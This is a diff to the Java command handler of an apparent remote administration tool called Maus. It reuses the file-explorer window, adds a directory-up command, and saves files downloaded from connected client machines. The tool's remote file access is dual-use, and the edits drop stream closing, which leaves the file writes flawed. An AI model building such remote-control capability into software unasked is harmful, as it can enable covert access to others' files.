@@ -1,5 +1,6 @@
 package Server;
 
+import GUI.Components.FileContextMenu;
 import GUI.Controller;
 import GUI.ResizeHelper;
 import GUI.Views.FileExplorerView;
@@ -19,6 +20,7 @@ class ProcessCommands implements Repository {
 
     static void processCommands(InputStream is, ClientObject client) throws IOException {
         DataInputStream dis = new DataInputStream(is);
+        final Stage[] fileExplorer = {null};
         while (true) {
             String input;
             try {
@@ -34,6 +36,8 @@ class ProcessCommands implements Repository {
                     sb.append(dis.readUTF()).append("\n");
                 }
                 SendCommandView.getConsole().appendText(sb.toString());
+            } else if (input.contains("DIRECTORYUP")){
+                client.clientCommunicate("FILELIST");
             }
             else if (input.contains("FILELIST")) {
                 String pathName = dis.readUTF();
@@ -43,26 +47,27 @@ class ProcessCommands implements Repository {
                     fileNames[i] = dis.readUTF();
                 }
                 Platform.runLater(() -> {
-                    Stage stage = new Stage();
-                    stage.setMinWidth(400);
-                    stage.setMinHeight(400);
-                    stage.initStyle(StageStyle.UNDECORATED);
-                    stage.setScene(new Scene(FileExplorerView.getFileExplorerView(pathName, fileNames, stage, client), 900, 500));
-                    ResizeHelper.addResizeListener(stage);
-                    stage.show();
+                    if (fileExplorer[0] == null) {
+                        fileExplorer[0] = new Stage();
+                        fileExplorer[0].setMinWidth(400);
+                        fileExplorer[0].setMinHeight(400);
+                        fileExplorer[0].initStyle(StageStyle.UNDECORATED);
+                        fileExplorer[0].setScene(new Scene(new FileExplorerView().getFileExplorerView(pathName, fileNames, fileExplorer[0], client), 900, 500));
+                        ResizeHelper.addResizeListener(fileExplorer[0]);
+                        fileExplorer[0].show();
+                    }
+                    fileExplorer[0].setScene(new Scene(new FileExplorerView().getFileExplorerView(pathName, fileNames, fileExplorer[0], client), 900, 500));
                 });
             }
             else if (input.contains("DOWNLOAD")) {
-                String saveDirectory = dis.readUTF();
-
+                String saveDirectory = FileContextMenu.selectedDirectory;
                 long fileLength = dis.readLong();
                 String fileName = dis.readUTF();
-
                 File downloadedFile = new File(saveDirectory + "/" + fileName);
                 FileOutputStream fos = new FileOutputStream(downloadedFile);
+
                 BufferedOutputStream bos = new BufferedOutputStream(fos);
                 for (int j = 0; j < fileLength; j++) bos.write(dis.readInt());
-
             }
             else if (input.contains("FILES")) {
                 int filesCount = dis.readInt();
@@ -77,7 +82,6 @@ class ProcessCommands implements Repository {
                     BufferedOutputStream bos = new BufferedOutputStream(fos);
 
                     for (int j = 0; j < fileLength; j++) bos.write(dis.readInt());
-                    bos.close();
                 }
             }
             /* Uninstall and close remote server - remove from Maus */
